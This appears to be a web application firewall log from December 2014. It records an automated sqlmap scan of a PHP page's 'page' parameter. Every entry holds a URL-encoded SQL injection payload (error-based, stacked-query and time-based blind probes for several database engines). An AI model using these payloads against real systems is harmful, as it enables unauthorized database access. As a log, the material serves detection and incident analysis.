7-12-2014 19:21:21 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%29%20AND%20%28SELECT%205336%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%285336%3D5336%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27atyb%27%3D%27atyb&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:21 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%20AND%20%28SELECT%205336%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%285336%3D5336%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27DoKt%27%3D%27DoKt&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:21 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%25%27%20AND%20%28SELECT%205336%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%285336%3D5336%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27%25%27%3D%27&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:21 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%20%28SELECT%205336%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%285336%3D5336%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29--%20EtVH&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%29%20AND%201049%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281049%3D1049%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%288930%3D8930&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%201049%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281049%3D1049%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%29%20AND%201049%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281049%3D1049%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27OJzB%27%3D%27OJzB&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%20AND%201049%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281049%3D1049%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27FFZp%27%3D%27FFZp&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%25%27%20AND%201049%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281049%3D1049%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27%25%27%3D%27&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:23 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%201049%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281049%3D1049%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20spIU&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:23 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%29%20AND%206959%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%286959%3D6959%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%20AND%20%288291%3D8291&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:23 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%206959%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%286959%3D6959%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:24 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%29%20AND%206959%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%286959%3D6959%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%20AND%20%28%27TNid%27%3D%27TNid&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:24 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%20AND%206959%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%286959%3D6959%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%20AND%20%27redV%27%3D%27redV&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:24 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%25%27%20AND%206959%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%286959%3D6959%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%20AND%20%27%25%27%3D%27&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:25 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%206959%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%286959%3D6959%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29--%20Qavd&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:25 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%29%20AND%209247%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289247%3D9247%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%288981%3D8981&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:25 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%209247%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289247%3D9247%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:25 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%29%20AND%209247%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289247%3D9247%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27PZOn%27%3D%27PZOn&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%20AND%209247%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289247%3D9247%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27PtXf%27%3D%27PtXf&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%25%27%20AND%209247%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289247%3D9247%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27%25%27%3D%27&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%209247%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289247%3D9247%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20UuIs&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=%28SELECT%20CONCAT%280x71626a6b71%2C%28SELECT%20%28CASE%20WHEN%20%282594%3D2594%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7176787671%29%29&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=%28SELECT%20%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281433%3D1433%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%29&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:27 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285096%3D5096%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:27 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=%28SELECT%20CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282869%3D2869%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%20FROM%20DUAL%29&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:27 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=SELECT%20%27qbjkq%27%7C%7C%28SELECT%20%28CASE%20WHEN%20%283340%3D3340%29%20THEN%201%20ELSE%200%20END%29%29%7C%7C%27qvxvq%27&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:27 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%29%3B%20SELECT%20SLEEP%285%29--%20&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:28 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%3B%20SELECT%20SLEEP%285%29--%20&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:28 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%29%3B%20SELECT%20SLEEP%285%29--%20&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:28 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%3B%20SELECT%20SLEEP%285%29--%20&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:28 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%25%27%3B%20SELECT%20SLEEP%285%29--%20&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%3B%20SELECT%20SLEEP%285%29--%20&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%29%3B%20SELECT%20PG_SLEEP%285%29--&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%3B%20SELECT%20PG_SLEEP%285%29--&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:30 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%29%3B%20SELECT%20PG_SLEEP%285%29--&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:30 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%3B%20SELECT%20PG_SLEEP%285%29--&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:30 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%25%27%3B%20SELECT%20PG_SLEEP%285%29--&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:31 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%3B%20SELECT%20PG_SLEEP%285%29--&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%29%20AND%20SLEEP%285%29%20AND%20%285525%3D5525&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%20SLEEP%285%29&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%29%20AND%20SLEEP%285%29%20AND%20%28%27rfhN%27%3D%27rfhN&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%20AND%20SLEEP%285%29%20AND%20%27ATuA%27%3D%27ATuA&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:34 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%25%27%20AND%20SLEEP%285%29%20AND%20%27%25%27%3D%27&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:34 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%20SLEEP%285%29--%20Iemj&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:34 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%29%20AND%203365%3D%28SELECT%203365%20FROM%20PG_SLEEP%285%29%29%20AND%20%286287%3D6287&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:34 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%203365%3D%28SELECT%203365%20FROM%20PG_SLEEP%285%29%29&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:35 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%29%20AND%203365%3D%28SELECT%203365%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27OWea%27%3D%27OWea&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:36 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%20AND%203365%3D%28SELECT%203365%20FROM%20PG_SLEEP%285%29%29%20AND%20%27Jsxh%27%3D%27Jsxh&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:36 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%25%27%20AND%203365%3D%28SELECT%203365%20FROM%20PG_SLEEP%285%29%29%20AND%20%27%25%27%3D%27&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:36 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%203365%3D%28SELECT%203365%20FROM%20PG_SLEEP%285%29%29--%20FxAw&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:38 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%29%20AND%207986%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2874%29%7C%7CCHR%2880%29%7C%7CCHR%28104%29%2C5%29%20AND%20%289298%3D9298&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:38 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%20AND%207986%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2874%29%7C%7CCHR%2880%29%7C%7CCHR%28104%29%2C5%29&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:38 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%29%20AND%207986%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2874%29%7C%7CCHR%2880%29%7C%7CCHR%28104%29%2C5%29%20AND%20%28%27sbiJ%27%3D%27sbiJ&id=2&attempt=1 | Referer: no referer

7-12-2014 19:21:39 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori%27%20AND%207986%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2874%29%7C%7CCHR%2880%29%7C%7CCHR%28104%29%2C5%29%20AND%20%27CzvR%27%3D%27CzvR&id=2&attempt=1 | Referer: no referer

